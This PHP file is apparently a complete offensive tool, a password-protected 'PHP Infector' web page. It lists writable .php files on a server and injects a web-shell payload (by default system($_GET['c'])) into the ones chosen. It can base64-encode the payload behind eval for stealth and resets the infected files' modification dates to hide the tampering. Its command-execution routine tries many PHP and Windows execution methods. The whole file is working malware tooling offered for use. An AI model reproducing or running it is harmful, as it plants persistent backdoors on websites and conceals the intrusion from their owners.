<?php

$key = "75b1f8ee50ac903fdbdb3d83fc418388d66ca176"; //sha1('7359')
session_start();

function getFiles($dir){ // retorna os arquivos .php de $dir e de seus subdiretórios recursivamente
	$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir)); //lista recursivamente
	$me = $_SERVER["SCRIPT_FILENAME"]; //euzinhaaa
	foreach ($iterator as $file) {
	    if(!is_dir($file) && is_writable($file)){ //lista só arquivos writables
	    	$path = $file->getPathname(); //path completo dos arquivos
	    	$relative_path = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path); //path relativo ao host atual
	    	if($path !== $me){
	    		if(substr($path, -4) == ".php"){
					echo("<label><li><input type='checkbox' class='chk' name='chk[]' value='".$path."'> <a href='http://$_SERVER[HTTP_HOST]/$relative_path' target='_blank'>".$relative_path."</a><span style='float:right;margin-left:50px;'>".round(filesize($path)/1024, 2)." Kb - ".date("d/m/Y H:i:s",filectime($path))."</span></li></label>");
	    		}
	    		
	    	}else{ // se for o próprio arquivo, fica vermelho
	    		echo("<label class='me'><li><input type='checkbox' class='chk' name='chk[]' value='".$path."''> <a href='http://$_SERVER[HTTP_HOST]/$relative_path' target='_blank'>".$relative_path."</a> (me) <span style='float:right;margin-left:50px;'>".round(filesize($path)/1024, 2) ." Kb - ".date("d/m/Y H:i:s",filectime($path))."</span></li></label>");
	    	}
		}
	}
}



function enfia($str, $file, $position=1){
	$old = file_get_contents($file);
	if($position){ // final do arquivo
  		file_put_contents($file, $old."\n".$str);
	}else{ // começo do arquivo
  		file_put_contents($file, $str."\n".$old);
	}
}



function alfa_php_cmd($cmd){ //borrowed from alfa shell v4.1  xD
	$out='';
	try{
		if(function_exists('exec')){
			@exec($cmd,$out);
			$out = @join("\n",$out);
		}elseif(function_exists('passthru')) {
			ob_start();
			@passthru($cmd);
			$out = ob_get_clean();
		}elseif(function_exists('system')){
			ob_start();
			@system($cmd);
			$out = ob_get_clean();
		} elseif (function_exists('shell_exec')) {
			$out = shell_exec($cmd);
		}elseif(function_exists("popen")&&function_exists("pclose")){
			if(is_resource($f = @popen($cmd,"r"))){
				$out = "";
				while(!@feof($f)){
					$out .= fread($f,1024);
					pclose($f);
				}
			}
		}elseif(function_exists('proc_open')){
			$pipes = array();
			$process = @proc_open($cmd.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
			$out=@stream_get_contents($pipes[1]);
		}elseif(class_exists('COM')){
			$alfaWs = new COM('WScript.shell');
			$exec = $alfaWs->exec('cmd.exe /c '.$cmd);
			$stdout = $exec->StdOut();
			$out=$stdout->ReadAll();
		}
	}catch(Exception $e){}
	return $out;
}


function changeDate($file, $date){ // muda a data de modificação do arquivo $file pra $date
	try{ 
		@touch($file, $date, $date);
		@alfa_php_cmd("touch -d '".date("d/m/Y H:i:s",$date)."' '".addslashes($file)."'"); 
	}catch (Exception $ex){
		echo "Can't change file modification date.<br>".$ex->getMessage();
	}
}



?>


<!DOCTYPE html >
<html lang="pt_BR">
<head>
<meta charset="utf-8" />
<title>PHP Infector</title>
<style>
	body{
		background-color: #101010;
		color: #ccc;
		font-family: Overpass Sans, sans-serif;
	}
	textarea{
		background-color: #101010;
		color: #1E7E13;
		font-family: Courier;
		width:100%;
		height:150px;
		padding:10px;
		border-radius:5px;
		border: solid 1px #aaa;
	}
	.submit{
		background-color:#101010;
		color:#ccc;
		border: solid 1px #aaa;
		padding:8px;
		font-size: 17px;
		float:right;
		margin-right:-20px;
		border-radius:5px;
		padding-left:15px;
		padding-right:15px;
	}
	.list{
		background-color:#101010;
		color:#ccc;
		border: solid 1px #aaa;
		float:right;
		margin-right:-20px;
		font-size:16px;
		padding:4px;
		padding-left:15px;
		padding-right:15px;
		border-radius:5px;
	}
	.path{
		background-color:#101010;
		color:#ccc;
		border: solid 1px #aaa;
		padding:4px;
		font-size: 17px;
		margin-bottom:10px;
		border-radius:5px;
		width:80%;
	}
	#container{
		width:800px;
		text-align:left;
		word-wrap: break-word;
	}
	.phpinfector{
		color:#fff;
		font-weight: bold;
		font-size: 95px;
		font-family: Courier New;
		text-shadow: 0 0 10px #aaa;
		display:inline-block;
		vertical-align: middle;
	}
	.ok{
		display:inline-block; 
		min-width:2.2cm; 
		width:80px; 
		align: center;
		vertical-align: middle;
	}
	.c0d3r{
		color:#44BD22;
		text-shadow: 0 0 10px #44BD22;
		font-family:Courier New;
		margin-left:250px;
	}
	a:link{
		color:#44BD22;
	}
	a:visited{
		color:#44BD22;
	}


	#files{
		width:100%;
		max-height: 300px;
		border: solid 1px #aaa;
		border-radius:5px;
		overflow:auto;
		padding:10px;
	}
	#files ul{
		list-style: none;
		margin-left:0;
		float:left;
	}

	#files li:hover{
		background-color:#505050;
	}
	.me{
		color:#BD222B;
	}
	.result{
		overflow-wrap: break-word;
 		 word-wrap: break-word;
 		 hyphens: auto;
	}
	ul{
		width:80%;
	}
	.login{
		text-align:center;
		padding:50px;
	}
	.password{
		background-color:#101010;
		color:#ccc;
		border: solid 1px #aaa;
		padding:5px;
		font-size: 18px;
		margin-bottom:10px;
		border-radius:5px;
	}


</style>
<link rel="shortcut icon" href="https://i.imgur.com/K1UWV6W.png" />
</head>

<?php

function login(){ // exibe formulário de login
	?>
	<br><br><br><br><br><br><br><br>
	<br><br><br><br><br><br><br><br>
	<center><div class="login">
		<form method="POST" name='f0rm'>
			<span style='display:inline;'>
			<input type="password" class="password" name="password" placeholder="Password" /> 
			<img src='https://i.imgur.com/Wt5C47e.gif' style='width:50px; vertical-align:middle; cursor:pointer;' onclick="document.forms['f0rm'].submit();"/></span>
		</form></div>
	</div>


	<?php
}


if(!isset($_SESSION['key']) || $_SESSION['key'] !== $key){ // se não tiver sessão, o usuário não está logado
	if(!isset($_POST['password'])){ // se ele não enviou senha, exibe login
		login();
		exit();
	}else{
		$pass = $_POST['password'];
		if(sha1($pass) !== $key){ // se a senha for diferente da key, exibe login
			login();
			echo "<script>document.getElementsByClassName('password')[0].style.border = 'dashed 1px #f00'</script>";
			exit();
		}else{
			$_SESSION['key'] = sha1($pass); //se tiver logado, cria session
		}
	}
}


?>




<script>
	function toggle(source) {
	  checkboxes = document.getElementsByClassName('chk');
	  for(var i=0, n=checkboxes.length;i<n;i++) {
	    checkboxes[i].checked = source.checked;
	  }
	}
</script>


<body>

<center><br>
<img class='ok' src='https://i.imgur.com/Wt5C47e.gif' />
<a class='phpinfector'>PHP Infector</a>
<img class='ok' src='https://i.imgur.com/Wt5C47e.gif' /><br>
<a class='c0d3r' href='https://github.com/Nickguitar' target='_blank'>C0ded by Nickguitar.dll</a>
<br><br><br>

<div id="container">
<form method="POST">
<?php
if(isset($_POST['path'])){
	echo "<input type='text' name='path' class='path' value='".$_POST['path']."' />";
}else{
	echo '<input type="text" name="path" class="path" value="'.getcwd().'" />';
}

?>

<input type="submit" class='list' value="List"/>

</form>
<form method="POST">
<div id='files'>
<ul>
<label><li><input type='checkbox' onClick="toggle(this)"> All <i>(writable)</i> files</li></label>
<br>
<?php 
try{
	if(isset($_POST['path'])){
		getFiles($_POST['path']);
	}else{
		getFiles(getcwd());
	}
}catch(Exception $ex){
	die("Error: ".$ex->getMessage());
}
?>
</ul>
</div>

<br>


&lt;?php<br><br>
<textarea name="payload">
if(isset($_GET['c'])){
   system($_GET['c']);
}</textarea><br>
<br><label><input type='checkbox' name='encode' value=1> Encode Payload (<i>stealthier</i>)</label> <span style='margin:30px'>Position of payload: <label><input type="radio" id="position" name="position" value="top" checked> Top</label> <label><input type="radio" id="position" name="position" value="bottom"> <input type="submit" class='submit' value='Infect'> Bottom</label></span>
</form><br><br>
<div class='result'>
<?php

if(isset($_POST['payload']) && isset($_POST['chk']) && isset($_POST['position'])){
	if(isset($_POST['encode']) && $_POST['encode'] == 1){ //se o payload for encodado
		$payload = "<?php eval(base64_decode('".base64_encode($_POST['payload'])."')); ?>"; // encoda com base64 e eval
	}else{
		$payload = "<?php ".$_POST['payload']." ?>"; // se nao, não
	}
	$payload =  $payload;

	$file_list = $_POST['chk']; //array com os arquivos a serem infectados

	echo "Injecting Payload... <br><br>".htmlentities($payload)."<br><br>";

	foreach ($file_list as $file){
		$relative_path = str_replace($_SERVER['DOCUMENT_ROOT'], "", $file);
		$date = filectime($file); //data de modificaçao do arquivo antes de ele ser alterado
		
		if($_POST['position'] == "top"){
			enfia($payload, $file, 0);
		}elseif($_POST['position'] == "bottom"){
			enfia($payload, $file, 1);
		}else{
			die("Wrong payload position.");
		}
		changeDate($file, $date); // tenta mudar a data de modificaçao do arquivo
		echo "<a style='color:#1E7E13;' href='http://".$_SERVER['HTTP_HOST']."/".$relative_path."'>".$file."</a> Infected!<br>";
	}
}

?>
</div>
</div><br><br><br>
</center>
</body>
